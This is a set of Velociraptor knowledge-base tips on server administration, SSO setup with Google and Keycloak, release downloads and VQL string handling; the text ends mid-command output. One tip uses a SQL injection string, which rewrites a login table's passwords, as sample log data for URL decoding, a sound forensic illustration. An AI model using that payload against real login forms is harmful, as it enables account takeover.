Note the `spec` parameter is a JSON encoded blob of the various
artifact parameters.

By including the VQL in a notebook, any user can collect it and
install the favorites in their own profile.

Tags: #configuration #GUI

---END OF FILE---

======
FILE: /content/knowledge_base/tips/deleting_old_data.md
======
# How to manage storage space on the server

Velociraptor can collect a lot of data quickly but usually the data is
only relevant for short periods of time.

Disk space management is an important part of Velociraptor
administrators tasks. You can keep an eye on the disk utilization as
shown on the dashboard.

If you need to grow the disk during an investigation, and you are
using a cloud VM from Amazon with Elastic Block Storage (EBS), disk
space management is very easy. In the AWS cloud it is possible to
resize disk space dynamically. See [Requesting
Modifications](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/requesting-ebs-volume-modifications.html)
to Your EBS Volumes and [Extending a Linux File System After
Resizing](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/recognize-expanded-volume-linux.html)
a Volume. You can do this without even restarting the server.

If you must attach a new volume you can migrate data from the old
datastore directory (as specified in the config file) to the new
directory by simply copying all the files. You must ensure permissions
remain the same (typically files are owned by the `velociraptor` low
privilege local linux account).

It is also possible to start with an empty datastore directory and
only copy selected files:

1. The `users` directory contains user accounts (hashed password etc)
2. The `acl` directory contains user ACLs
3. The `artifact_definitions` contains custom artifacts
4. The `config` directory contains various configuration settings.
5. The `orgs` directory contains data from various orgs.

Velociraptor will automatically re-enroll clients with the same client
id (The client id is set by the client itself) as needed.

You can also check the backups directory to recover from backup.

## Management of old collections

You can automatically delete old collections using the
[Server.Utils.DeleteManyFlows
](/artifact_references/pages/server.utils.deletemanyflows/) and
[Server.Utils.DeleteMonitoringData
](/artifact_references/pages/server.utils.deletemonitoringdata/)
artifacts. These are server artifacts which can delete flows and
monitoring data older than the specified time.

Tags: #configuration #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/plugin_not_found.md
======
# What to do about error "Plugin info not found"

Velociraptor VQL queries can run on the server in the context of
server artifacts or notebook queries. Usually server side VQL is used
to post-process collected results, manage the server configuration,
schedule new collections etc.

However, server side VQL can do a lot more than that - including shell
out to external binaries, read and write files on the server or
connect to external servers. In some deployments (especially shared
deployments) it is desirable to block any functionality on the server
which may interfere with other users or server security or
configuration.

In recent Velociraptor versions the administrator can add an allow
list to the configuration file. This forces server side VQL to only
register plugins on the allow list, so potentially dangerous plugins
are not present at all (regardless of the Velociraptor permission
model).

The configuration wizard will offer this functionality using the
question:

```
Do you want to restrict VQL functionality on the server?

This is useful for a shared server where users are not fully trusted.
It removes potentially dangerous plugins like execve(),filesystem access etc.
```

If you selected this during configuration you will receive these
errors in the notebook (or using the API) for any plugins not in the
allow list:

```
ERROR:Plugin info not found.
```

If you decide you need this particular plugin you can either add to
the allow list in the server configuration file. Or you may remove the
allow list entirely (which allows all plugins to be registered).

Tags: #vql #configuration #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/upgrading.md
======
# How do I upgrade my server and clients?

To upgrade the Velociraptor server to a new version, simply download the latest release binary from the GitHub Release Page and regenerate a new `Debian` package as described above, but using the existing configuration file.

See [this page for more details]({{< ref "/docs/deployment/server/#server-upgrades" >}})

To upgrade the Velociraptor clients, you will need to push out new MSIs using the existing client configuration files.

More details on [Client upgrades]({{< ref "/docs/deployment/clients/#client-upgrades" >}})

## Supported Upgrade Scenarios

Matching client and server versions is the most supported configuration.
See [the support policy]({{< ref "/docs/overview/support/#client-and-server-versioning" >}})

Before upgrading perform testing of the combination of client and server versions to be used, compatibility of mixed versions is best efforts based on community testing and issues being reported.

 - Check [GitHub](https://github.com/Velocidex/velociraptor/issues) for issues reported by the community.
 - Read [release notes](https://github.com/Velocidex/velociraptor/releases) for all  versions between the current version, and the version you are moving to if skipping versions. Generally though avoid skipping versions.


## Other tips

 - Recent versions of clients and servers generally can communicate with each other without a problem, but new functionality may not be available on old clients. Artifacts like [this](https://github.com/Velocidex/velociraptor/issues/1566) will (0.6.4+) help reduce this.
 - Upgrading the server before clients is more common, so version problems are more likely to have been caught in community testing with this approach.
 - Consider running a parallel deployment as the most compatible way to upgrade. Such as when upgrading and there are known breaking changes between the current client and target server versions (going from self-signed to auto cert), or when there are large version differences (unusual combinations of client and server).

Tags: #configuration #admin

---END OF FILE---

======
FILE: /content/knowledge_base/tips/startup_artifacts.md
======
# What is the easiest way to have Velociraptor start with a custom server artifact automatically loaded?

Velociraptor frontend process has a component called the `Artifact
Repository`. This component knows about all the artifacts that are
defined. When the server starts up, it loads artifacts into the
repository from the following sources.

1. Built in artifacts are embedded into the binary itself.
2. It is possible to provide custom artifacts inside the configuration
   file itself.
3. Providing a directory with the `--definitions` flag will cause
   Velociraptor to scan the directory for artifact YAML files.
4. Finally, the server will load artifacts from the configured
   filestore path under `<filestore>/artifact_definitions`. These are
   usually the custom artifacts defined through the GUI.

The location of where an artifact came from does not matter,
Velociraptor organizes artifacts internally using the artifact
name. It is customary to denote custom artifacts with the `Custom.`
prefix but this is not mandatory.

{{% notice warning Overriding built in artifacts %}}

Velociraptor does not allow a custom artifact to override a built in
artifact (i.e. have the same name). Built in artifacts are protected
because overriding built in artifacts may break the proper
functionality of Velociraptor. If you want to customize a built in
artifact, simply change the name when you save it.

Velociraptor considers artifacts defined in the config file, or given
in the `--definitions` directory as "built in".

{{% /notice %}}

## Specifying a startup artifact.

When the Velociraptor server is run for the very first time, it
creates an install record in the filestore
`<filestore>/config/install_time.json.db`. It can then setup initial
artifacts to collect as specified by the config file:

```yaml
Frontend:
  default_client_monitoring_artifacts:
  - Generic.Client.Stats
  initial_server_artifacts:
  - MyServerArtifact
  default_server_monitoring_artifacts:
  - MyCustomServerMonitor
```

In the above snippet, we see the following parameters:

* `default_client_monitoring_artifacts` specifies the initial client
  monitoring table that will be created. By default, Velociraptor
  collects endpoint CPU and Memory telemetry from all endpoints. You
  can remove this, or specify a different client artifact to collect.

* `default_server_monitoring_artifacts` specifies an initial set of
  server event artifacts to collect.

* `initial_server_artifacts` is a list of server artifacts that will
  be automatically launched on the server on initial startup. You can
  specify the names of any artifacts here (including custom artifacts)
  which can be bootstrapped to perform any kinds of server
  configuration needed. The artifacts are simply scheduled and will
  appear in the usual `Server Artifacts` screen.

{{% notice note %}}

Currently it is not possible to specify parameters for initial
artifacts so if you need to tweak the parameters it is best to create
a custom artifact that in turn launches the needed artifacts with the
correct parameters.

{{% /notice %}}


Tags: #deployment #configuration

---END OF FILE---

======
FILE: /content/knowledge_base/tips/getting_latest_release.md
======
# How do I get the latest release binary?

The Velociraptor release process uses a release branch to prepare a
new release. Releases go through a release candidate (RC) process with
one or more release builds.  Sometimes after the release a new patch
release is made to backport critical bug fixes.

If you need to automate downloading of the latest release binary,
simply use the GitHub API which presents detailed release information
in JSON form. You can use a tool such as `jq` to extract the download
URL:

```bash
WINDOWS_URL=$(curl -s https://api.github.com/repos/velocidex/velociraptor/releases/latest | jq
-r '[.assets | sort_by(.created_at) | reverse | .[] | .browser_download_url | select(test("windows-amd64.exe$"))][0]')
LINUX_URL=$(curl -s https://api.github.com/repos/velocidex/velociraptor/releases/latest | jq
-r '[.assets | sort_by(.created_at) | reverse | .[] | .browser_download_url | select(test("linux-amd64$"))][0]')
MACOS_URL=$(curl -s https://api.github.com/repos/velocidex/velociraptor/releases/latest | jq
-r '[.assets | sort_by(.created_at) | reverse | .[] | .browser_download_url | select(test("darwin-amd64$"))][0]')
```

The above `jq` filter sorts all asserts by creation data and filters
the relevant binaries, then extracts the most recent binary.

Powershell can also be used to download the latest binary for 64 bit Windows as per this example:

```PowerShell
#Get the latest entry from the GitHub API
$VeloLatest = Invoke-WebRequest https://api.github.com/repos/velocidex/velociraptor/releases/latest
#Parse out the url to the binary
$VeloURL = ($VeloLatest.content | convertfrom-json).assets.browser_download_url | select-string windows-amd64.exe | select-object -First 1
#Download and write to a file
Invoke-WebRequest -Uri $VeloURL.tostring() -OutFile velociraptor.exe
#Verify the Authenticode Signature
Get-AuthenticodeSignature .\velociraptor.exe
```

## Verifying signatures

Velociraptor releases are signed using Authenticode on Windows as well
as using GPG. To verify the signatures using gpg:

```
$ gpg --verify velociraptor-v0.6.5-2-linux-amd64.sig
gpg: assuming signed data in 'velociraptor-v0.6.5-2-linux-amd64'
gpg: Signature made Wed Jul 27 02:49:33 2022 AEST
gpg:                using RSA key 0572F28B4EF19A043F4CBBE0B22A7FB19CB6CFA1
gpg: Good signature from "Velociraptor Team (Velociraptor - Dig deeper!  https://docs.velociraptor.app/) <support@velocidex.com>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: 0572 F28B 4EF1 9A04 3F4C  BBE0 B22A 7FB1 9CB6 CFA1
```

You may need to import the key first into your keyring:

```
$ gpg --receive-keys 0572F28B4EF19A043F4CBBE0B22A7FB19CB6CFA1
gpg: key B22A7FB19CB6CFA1: public key "Velociraptor Team (Velociraptor - Dig deeper!  https://docs.velociraptor.app/) <support@velocidex.com>" imported
gpg: Total number processed: 1
gpg:               imported: 1
```


{{% notice warning "API limiting" %}}

GitHub limits how many unauthenticated API requests are allowed per IP
address. If you need to increase this limit, create a personal access
token (see
https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token)

{{% /notice %}}

Tags: #configuration #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/urldecode.md
======
# How can I url/percent decode a string?

During investigation you may find logs or other data with percent-encoded strings. 
Since 0.6.5 we have included a lambda function in regex_replace() that enables decode and managing errors to enable analysis.

```vql
LET Line = '''http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00'''

SELECT regex_replace(source=Line, replace_lambda="x=>unhex(string=x[1:]) || x", re="%..") as Decoded FROM scope() 

```

![Url Decode: results](https://user-images.githubusercontent.com/13081800/172098424-d78c73f9-e7d2-405b-99ca-129eba4350c0.png)


Similarly, to URL encode we can run a similar function:

```vql
LET Line = '''http://target/login.asp?userid=bob'; update logintable set passwd='0wn3d';--'''

SELECT
    url(path=Line).String[1:] as URLFunction,
    regex_replace(source=Line,replace_lambda="x=>format(format='%%%02x',args=x)", re="[^a-z0-9\\-_.~:/?]") as ManualMethod
FROM scope()
```

![Url Encode: results](https://user-images.githubusercontent.com/13081800/187116187-9347d6be-5566-49b0-98d6-65ce0d2ff0cc.png)



Tags: #decode #encode #url #vql

---END OF FILE---

======
FILE: /content/knowledge_base/tips/random.md
======
# How do you generate random characters?

Using the rand() function we can manipulate the results to output a character set then use the WHERE condition to filter for the characters of interest.

For example output 32 random printable characters:  
```
  LET RandomChars = SELECT format(format="%c", args=rand(range=255)) AS Character
  FROM range(end=9999999999)
  WHERE Character =~ "[ -~]"
  LIMIT 32

SELECT join(array=RandomChars.Character) as Characters FROM scope()
```
Modify the Character WHERE regex and LIMIT for desired results.

![image](https://github.com/Velocidex/velociraptor-docs/assets/13081800/15d5e7f3-f519-4446-bbcb-fb42d97f4197)

Tags: #random, #vql

---END OF FILE---

======
FILE: /content/knowledge_base/tips/huntlabel.md
======
# Applying labels to hunt results

Sometimes it is useful to label clients from a hunt.

For the following example, I will label all machines with rows from the Windows.Carving.CobaltStrike artifact with a label "CobaltStrike".

```vql
SELECT ClientId,Fqdn,Rule,
    label(client_id=ClientId,labels=['CobaltStrike'],op='set') as SetLabel
FROM source(artifact="Windows.Carving.CobaltStrike")
GROUP BY ClientId
```

![Label clients from hunt](https://user-images.githubusercontent.com/13081800/169450498-39d31902-81ec-4b7c-8c6c-72abe0419c7e.png)

Tags: #labels

---END OF FILE---

======
FILE: /content/knowledge_base/tips/setup_google_oauth.md
======
# How to set up authentication using Google OAuth SSO

This guide walks you through the configuration of Google OAuth SSO as an
authentication provider. This requires a user to authenticate via Google
Workspace using it's associated authentication policy. For example if 2-factor
authentication is required then users will need to satisfy this requirement.

Once the user authenticates to Google, they are redirected back into the
Velociraptor application with a token that allows the application to request
information about the user (for example, the username or email address).

## Before You Begin

Please note the following requirements:

* Your Velociraptor server must have a valid SSL certificate already issued and
  configured. This can be a certificate issued by Let's Encrypt or
  [another public CA]({{< ref "/knowledge_base/tips/ssl/" >}}).

* Google restricts OAuth 2.0 applications to using Authorized Domains. According
  to Google:
  > To use a domain as an authorized domain for OAuth, it must be a "top private
  > domain", which is the domain component available for registration on a
  > public suffix, such as the domain before the .com, .net, or .biz, or similar
  > top-level domains. Subdomains are controlled by the parent domain and are
  > not considered top private domains.
  >
  > For example, if your application home page is
  > https://sub.example.com/product, you would need to verify ownership of the
  > example.com domain. This verification is necessary to ensure the security and
  > trustworthiness of the application.



### Registering Velociraptor as an OAuth application

Before using Google to authenticate, you need to register your Velociraptor
deployment as an OAuth App with Google. You register Velociraptor as an OAuth
app by accessing the Google cloud console at https://console.cloud.google.com.
You must set up a cloud account and create a cloud project even if you do not
host your server on Google's Cloud Platform.

The ultimate goal of this step is to obtain OAuth credentials that will be used
in the Velociraptor configuration, but there are a few things set up first.

Navigate to `APIs and Services` in the GCP console and select `Credentials` and
the `OAuth Consent Screen` tab.

![Creating application credentials](sso11.png)

Further down the page you need to provide an authorized domain.

![Authorizing domains](sso12.png)

In order to add an Authorized Domain you need to *verify it*. Google's help pages
[explain it further](https://developers.google.com/identity/protocols/oauth2/production-readiness/brand-verification#authorized-domains).


In this example we assume that you purchased your domain with Google
domains which makes this step easier since it is already verified.

We can go back to the cloud console and `Create Credentials` > `OAuth client ID`:

![Creating OAuth2 client ID](sso15.png)

Now select `Web App` and set the `Authorized redirect URIs` to
`https://<Your Domain Name>/auth/google/callback` -
This is the URL that successful OAuth authentication will redirect
to. Velociraptor accepts this redirect and uses it to log the user on.

![Specifying the redirect URL](sso16.png)

If all goes well the Google Cloud Console will give us a client ID and
a client secret.

### Generating configuration

To generate a server config file run the `config generate` command to invoke the
configuration wizard:

```sh
velociraptor config generate -i
```

![Select SSO deployment type](config1.png)

![Select Google as authentication provider](config2.png)

![Enter OAuth credentials](config3.png)

The configuration wizard asks a number of questions and creates a
server configuration file. The first question is "Deployment Type" and you
should choose the option **Authenticate users with SSO**.

In addition to other common configuration questions the
following are relevant to configuring SSO:




* **What is the public DNS name of the Master Frontend**: This should match the
  CN field of your valid SSL certificate.
* **Select the SSO Authentication Provider**: Here you should choose the option "Google".
* **Enter the OAuth Client ID**: the name as specified in Google Cloud Console.
* **Enter the OAuth Client Secret**: as specified in Google Cloud Console.
* **GUI Username or email address to authorize:** The initial set of
  administrator accounts can be stored in the configuration file. When
  Velociraptor starts it will automatically add these accounts as
  administrators. When using SSO, Velociraptor does not use any passwords so
  only the user names will be requested. While accounts can be specified here it
  is optional as they can also be created later, as we'll show below. Entering a
  blank value will cause the wizard to move on to the next question.


## Grant Access to Velociraptor

The OAuth flow ensures the user's identity is correct but does not give them
permission to log into Velociraptor. Note that having an OAuth-enabled
application on the web allows anyone with a Google identity to authenticate to
the application but the user is still required to be authorized explicitly. If a
user is rejected, you will see messages similar to the following in the Audit
log:

```json
   {
     "level": "error",
     "method": "GET",
     "msg": "User rejected by GUI",
     "remote": "192.168.0.10:40570",
     "time": "2018-12-21T18:17:47+10:00",
     "user": "mike@velocidex.com"
   }
```

In order to authorize the user we must explicitly add them using the
Velociraptor Admin tool:

```text
$ velociraptor --config ~/server.config.yaml user add mike@velocidex.com
Authentication will occur via Google - therefore no password needs to be set.
```

Note that Velociraptor does not ask for a password, since authentication will
occur using Google's SSO.

## Authenticate and access the Velociraptor GUI

Since you have added users from the command line you will need to restart the
Velociraptor service:

```sh
sudo systemctl restart velociraptor_server
```

Then access the GUI. If your web browser is already logged into Google then the
authentication process should be transparent. If not then you will be directed
to Google to authenticate and you will then be redirected back to the
Velociraptor GUI after successful logon.

We can see that the logged in user is authenticated by Google, and we
can also see the user's Google avatar at the top right.

<!-- ![Velociraptor Dashboard](dashboard.png) -->


{{% notice note %}}

Velociraptor will retain its OAuth token for 24 hours. Each day users
will need to re-grant OAuth credentials. Therefore revoking a user
from the Google Admin console may take a full day to take effect. To
remove access sooner you should simply remove all permissions from the
user using `velociraptor user grant '{}'`.

{{% /notice %}}



Tags: #configuration #sso #deployment
---END OF FILE---

======
FILE: /content/knowledge_base/tips/proxy.md
======
# How do I set a proxy for client communications?

Many enterprise environments require a proxy to be set before outbound
web communications is allowed. The Velociraptor client uses HTTP to
communicate with the server, and therefore must use a proxy to
connect in such environments.

It is possible to specify the HTTP proxy using the configuration file
or environment variables.

### Environment variables.

Environment variables may be configured using group policy or similar
methods. Setting the `http_proxy` and `https_proxy` environment
variables will force the client to go through the specified proxy.

The rules for environment variables are described
[here](https://go.dev/src/net/http/transport.go#422):

```go
// ProxyFromEnvironment returns the URL of the proxy to use for a
// given request, as indicated by the environment variables
// HTTP_PROXY, HTTPS_PROXY and NO_PROXY (or the lowercase versions
// thereof). HTTPS_PROXY takes precedence over HTTP_PROXY for https
// requests.
//
// The environment values may be either a complete URL or a
// "host[:port]", in which case the "http" scheme is assumed.
// The schemes "http", "https", and "socks5" are supported.
// An error is returned if the value is a different form.
```

### Setting a proxy in the configuration file

You can also hard code the proxy in the configuration file's Client
section:

```yaml
Client:
  proxy: http://proxy.example.com:3128/
  server_urls:
  - https://velo.example.com:8100/
```


Tags: #configuration #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/setup_keycloak.md
======
# How to set up OIDC authentication using Keycloak

This guide walks you through the configuration of
[Keycloak](https://www.keycloak.org/) as an OIDC authentication provider for
Velociraptor.

Keycloak, as a self-hosted, free, and open source solution, may be an attractive
choice for Velociraptor deployments where using cloud-based and/or commercial
providers is not practical or possible. Most of the steps shown here would be
the same or similar for other self-hosted OIDC solutions (for example Zitadel or
Authentik), so it may be useful even if you are not using Keycloak.

{{% notice warning "Production deployment of Keycloak" %}}

Keycloak is a Java application which can be installed manually or deployed via
several officially documented container-based methods. This guide partly mirrors Keycloak's
[Getting started guide](https://www.keycloak.org/getting-started/getting-started-docker)
which uses Docker to create a _"development mode" instance_ of Keycloak. This
method starts a working Keycloak instance but does not create a persistent
database or a production-ready secured server, since the goal here is only to
demonstrate the integration with Velociraptor.

For production-ready deployment guidance we refer you to
[Configuring Keycloak for production](https://www.keycloak.org/server/configuration-production)
and the official [Keycloak documentation](https://www.keycloak.org/documentation).

{{% /notice %}}

As mentioned above, the goal of this guide is to demonstrate a working SSO
configuration for Velociraptor using Keycloak. The basic steps and configuration
will be very similar or even identical for production deployments however some
of the steps shown here are deliberately over-simplified for reasons of brevity
and therefore do not reflect security best practices. Also Keycloak has a vast
array of options and capabilities, which we recommend you explore later, but the
intention here is to get up and running with a basic working integration since
it is better to start simple and be sure that it's working as expected before
possibly adding complexity to it.

In this simplified setup we have two hosts, with DNS names `keycloak.local` and
`velociraptor.local`. Substitute your DNS names where applicable. The two hosts
don't need to be on the same network but the Velociraptor host needs to be able
to DNS-resolve the name of the Keycloak server and reach it on port 443. It's
not necessary that the Keycloak server be able to resolve the Velociraptor
server's DNS name but your server probably already has a DNS name already so
that clients can connect to it.

![Network overview](network_overview.svg)

The high-level steps of this setup process are:

1. Create a self-hosted Docker-based Keycloak instance.
2. Configure an authentication realm, OIDC client and test users in Keycloak.
3. Configure the authentication provider in Velociraptor.
4. Add test users to Velociraptor.
5. Test the authentication process.


## Create a Docker-based Keycloak instance

We assume that Docker has already been installed and configured on the
designated Keycloak host. We aren't going to use Docker Compose but for
production deployment you might prefer to do so, and example configurations can
be found on the internet.

Before we install Keycloak we are going to need a certificate for it to use. Here
we will generate a simple self-signed cert with corresponding private key but ideally in
production you would have a cert signed by a trusted CA.

**1. Generate a key pair**

```sh
# Create keycloak-server.crt.pem and keycloak-server.key.pem
openssl req -newkey rsa:2048 -nodes -subj "/CN=keycloak.local" \
-addext "subjectAltName=DNS:keycloak.local,IP:192.168.56.1" \
-keyout keycloak-server.key.pem -x509 -days 3650 -out keycloak-server.crt.pem
# Set appropriate permissions on files
chmod -R 644 keycloak-server*
```

NOTE: The certificate SAN is required by Velociraptor. If not present you will receive
this error when trying to start Velociraptor.\
`error: gui: starting frontend: Get "https://keycloak.local/.well-known/openid-configuration": x509: certificate relies on legacy Common Name field, use SANs instead`\
Putting the IP in the SAN is not really necessary but helpful if you need to
connect to Keycloak's admin page using it's IP.

Now that we have the key pair we can run Docker which will pull the latest
Keycloak image (26.0.7 at the time of writing).

**2. Run the Docker command.**

```sh
docker run -p 443:443 -e KC_HOSTNAME=keycloak.local \
-e KC_BOOTSTRAP_ADMIN_USERNAME=admin -e KC_BOOTSTRAP_ADMIN_PASSWORD=admin \
-v /root/keycloak-server.crt.pem:/etc/x509/https/keycloak-server.crt.pem \
-v /root/keycloak-server.key.pem:/etc/x509/https/keycloak-server.key.pem \
-e KC_HTTPS_CERTIFICATE_FILE=/etc/x509/https/keycloak-server.crt.pem \
-e KC_HTTPS_CERTIFICATE_KEY_FILE=/etc/x509/https/keycloak-server.key.pem \
quay.io/keycloak/keycloak:latest start-dev --https-port=443
```

We set various Keycloak config options as Docker environment variables and
make the cert and private key available inside the Docker using volume mapping.

If the Docker fails to start, you should inspect the command output for errors.
If successful it should report
`Listening on: http://0.0.0.0:8080 and https://0.0.0.0:443`.

The KC_BOOTSTRAP* variables create an initial user `admin` with password
`admin` which we use to configure Keycloak in the next section.

## Configure Keycloak

Next we go through the steps that are almost the same as described in Keycloak's
[Getting started guide](https://www.keycloak.org/getting-started/getting-started-docker).

Connect to Keycloak's Admin Console (in this case: https://keycloak.local) and
log in with the `admin` user.

**3. Create an authentication realm**

![](keycloak00.png)

You can use any name for the realm but here we are going to just use `myrealm`
for convenience.

![](keycloak01.png)

Click **Create**.

**4. Create OIDC client configuration for Velociraptor**

In this step we create a new client record and client secret which we will use
later in the Velociraptor configuration. In the realm selection drop-down ensure
that you are in the new `myrealm` realm.

In the sidebar select **Clients** and then select **Create client**.

![](keycloak02.png)

This will start a 3-page configuration wizard. On the first page the **Client
ID** is all that's required. Enter `velociraptor` and click **Next**.

![](keycloak03.png)

On the second page, choose **Client authentication: ON** and
**Authentication flow: Standard flow** (only). Then click **Next**.

![](keycloak04.png)

On the third page we use the following values (adapt to your DNS names if your
are replicating the setup in your own environment):

- Valid redirect URIs: `https://velociraptor.local:8889/auth/oidc/keycloak/callback`
- Valid post logout redirect URIs:
  `https://velociraptor.local:8889/app/logoff.html`
- Web origins: `https://velociraptor.local`

![](keycloak05.png)

Then click **Save**. Your OIDC client configuration is now created.

On the page that follows, go to the **Credentials** tab. There you will find the
**Client secret** which you will need for your Velociraptor configuration. It is
randomly generated and you can regenerate it if desired, but if you do so then
don't forget to update your Velociraptor server's config with the new secret.
Typically you would only regenerate it if you suspected a compromised secret.

![](keycloak06.png)

The next action is to configure email addresses as login usernames. To do that
navigate via the sidebar to **Realm settings** > **Login** tab. Ensure that
**Email as username** and **Login with email** are enabled. The additional user
preferences shown in the following screenshot are optional and in your case
would be determined by your organizational policies.

![](keycloak08.png)

The last action in this step is to configure the required actions for
authentication so that users don't have to enter additional information when
they first log in.
Navigate via the sidebar to **Authentication** > **Required actions** tab.
Disable all options except **Update password**.

**5. Create test users**

We will need at least one user account to test the authentication. From the
sidebar select **Users** and then click the **Create new user** button.

![](keycloak07.png)

For the user account I am going to create one named `bob@local`. Remember that
we previously enabled **Email as username** and **Login with email**, so all
other fields are optional. I also selected **Email verified** to avoid an email
verification step when logging in.

![](keycloak09.png)

After creating the account, go to the Credentials tab and set a password. Note
that we leave **Temporary:ON** set so that the password must be changed on first
logon. Note also that this is a simplified demonstration so for that reason
we're ONLY using password auth while Keycloak easily supports multi-factor
authentication.

![](keycloak10.png)

Repeat the user creation actions to also create a user account
`fred@local`.

![](keycloak11.png)

Now we are ready to move to configuring the Velociraptor side of things.

## Configure Velociraptor

{{% notice tip %}}

While configuring, testing and potentially troubleshooting problems, it's
easier if you can see Velociraptor's log messages. You can stop the server
service and then run the server manually on the command line by using the
following commands:

```bash
sudo systemctl stop velociraptor_server
sudo -u velociraptor bash
velociraptor -c /etc/velociraptor/server.config.yaml frontend -v
```

This will display the log messages in the terminal.

{{% /notice %}}

**6. Add the authenticator settings to your Velciraptor config**

In the `GUI` section of your Velociraptor config you should have the following
authenticator settings by default:

```yaml
  authenticator:
    type: Basic
```

We no longer want Basic auth and instead want SSO, so replace that with these
new settings to match our Keycloak configuration:

```yaml
    type: oidc
    oidc_issuer: https://keycloak.local/realms/myrealm
    oidc_name: keycloak
    avatar: https://www.keycloak.org/resources/images/logo.svg
    oauth_client_id: velociraptor
    oauth_client_secret: p4EABoniopnasbrmstDnsHrQcSukNmp2
```

The `oauth_client_secret` is the value we obtained at the end of step 4. The
`oauth_client_id` is the name we used for the OIDC Client ID in that same
section.

The `oidc_name` can be anything you want but it must exactly match
(case-sensitive) the substring used in the **Valid redirect URIs** field of the
client configuration in Keycloak.

Keycloak requires that the `oidc_issuer` field specify the path
`/realms/myrealm` as this is where is serves the OpenID Endpoint Configuration
that Velociraptor will need to access. If you have somehow gotten this wrong
then Velociraptor will log an error such as:
`[ERROR] can not get information from OIDC provider, check https://keycloak.local/.well-known/openid-configuration is correct and accessible from the server.`

Before you start Velociraptor, if you are using a self-signed cert for Keycloak
then also attend to the next step.

**7. Copy the Keycloak server cert to the trusted root store.**

Because the Keycloak server is using a certificate that wasn't issued by a
trusted CA, we need to add it's certificate to the trusted root store on the
Velociraptor server. Assuming your server is Ubuntu or similar this means saving
a copy of the certificate to `/etc/ssl/certs`.

Without this step you will see this error in the log when attempting to start
Velociraptor:
`error: gui: starting frontend: Get "https://keycloak.local/...": x509: certificate signed by unknown authority (possibly because of "crypto/rsa: verification error" while trying to verify candidate authority certificate "keycloak.local")`

**8. Start Velociraptor**

The server should now start cleanly and continue running. In the log messages
you should see `GUI will use the oidc authenticator`. That means everything is
OK with the authenticator config.

One possible gotcha is if the server's `GUI.public_url` setting is still using
an IP address or if `GUI.bind_address` is not set to `0.0.0.0` then you may get
stopped with the error:
`error: gui: starting frontend: Authentication type 'oidc' requires valid public_url parameter`

In this case the `GUI.public_url` is set to `https://velociraptor.local:8889/`.


## Add test users

We have created 2 users in Keycloak but these users don't yet exist in
Velociraptor. Velociraptor has it's own permissions model and therefore needs to
know about any users so that once they authenticate the correct permissions can
be applied.

Users can be created using VQL in Velociraptor notebooks but since we have now
switched authentication providers we no longer have access to the GUI. Of course
we could have added the users before we switched but let's pretend we didn't and
instead do it from the command line.

We will make `bob@local` a server admin and grant `fred@local` the "reader"
role, which provides minimal access to Velociraptor's GUI. The following two
commands will create these users:

**9. Add users to the datastore**

```sh
velociraptor --config server.config.yaml user add --role administrator bob@local
velociraptor --config server.config.yaml user add --role reader fred@local
```

NOTE: We provide the `--config` flag so that this invocation of the velociraptor
binary knows which datastore to add the new users to. This can be done while the
server service is running or not running, but either way the service will need
to be restarted to update itself with the datastore changes.

Because of our OIDC authenticator config, when adding each user we will receive
an acknowledgement message saying
`"Authentication will occur via oidc - therefore no password needs to be set."`

## Test authentication process

Test the authentication process by going to `https://velociraptor.local:8889/`

You will be presented with the choice to log in with Keycloak (multiple
authentication providers are supported but we only have one configured).

![](auth00.png)

Enter initial credentials (password that was set in Keycloak).

![Login page](auth01.png)

You will be required to change the password because we configured
**Temporary:ON** when setting the account's password.

![Change the password](auth02.png)

![Successful login!](auth03.png)

![We can verify that the user has the server admin role.](auth04.png)

![We can sign out... and sign in again.](auth05.png)

The same process applies to `fred@local` except that we can verify in
Velociraptor that the user has the read-only role.

{{% notice tip %}}

For testing multiple users in the same web browser you may have trouble
fully logging a user out because while logged out of Velociraptor the OIDC
session is still active.

Logout of the OIDC session can be achieved by
navigating to the the endpoint
`https://keycloak.local/realms/myrealm/protocol/openid-connect/logout`
from within the same web browser and choosing to log out.

{{% /notice %}}

## What next?

Once you have the working authentication setup, as per this guide, then you can
begin experimenting with additional options while knowing that any change which
causes a negative effect can be reverted back to a known working state. This is
a much easier approach than diving in with a complex configuration and spending
hours troubleshooting why it doesn't work.

Since the Docker installation used in the guide is non-permanent it will reset
when you restart the docker VM. For testing and experimenting that's a good
thing as you gain familiarity by going through the process. As mentioned,
Keycloak supports multifactor authentication, complex authentication flow
options, themeable login screens, and many other cool features. However for
permanent configuration you will need to learn how to create a persistent
Keycloak database, possibly using a different deployment method.

Tags: #configuration #sso #deployment
---END OF FILE---

======
FILE: /content/knowledge_base/tips/quarantine.md
======
# Custom quarantine exclusions

We may want to add custom exclusions to Velociraptor quarantine and allow communication to another IP

1. Add machine in scope to a new label: e.g NewQuarantine
2. Remove standard quarantine
3. Run a hunt targeting your label above or a collection on the single machine
4. Select relevant quarantine content:  Windows.Remediation.Quarantine
5. Add additional IP exclusions
   Action = Permit
   SrcAddr = me
   DstAddr = IP to exclude
   Mirrored = yes for bidirectional communication
   Description

![image](https://user-images.githubusercontent.com/13081800/222630435-4882554a-eefa-4a78-9ae2-fe41d3d60874.png)


Tags: #quarantine, #containment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/glibc_errors.md
======
# What do I do about "version GLIBC_2.xx not found" errors?

{{% notice tip "TLDR - use the `musl` build" %}}

Use the `musl` built binary for older Linux systems. You can
find this build together with the others on the release page with the
`-musl` suffix in the name.

{{% /notice %}}

On Linux, binaries always link to the C library dynamically. This
happens even with a static binary like Velociraptor. The C library is
intimately linked to the version of Linux installed on the system and
it is generally not possible to upgrade the C library without also
upgrading the entire Linux distribution.

During the build process, the compiler creates a version requirement
for this C library embedded in the binary itself. You can see the
exact version of all libraries needed at runtime using the `read_elf`
program:

```
$ readelf -V velociraptor-v0.6.4-linux-amd64
...
Version needs section '.gnu.version_r' contains 3 entries:
 Addr: 0x00000000004106a0  Offset: 0x0106a0  Link: 7 (.dynstr)
   000000: Version: 1  File: libdl.so.2  Cnt: 1
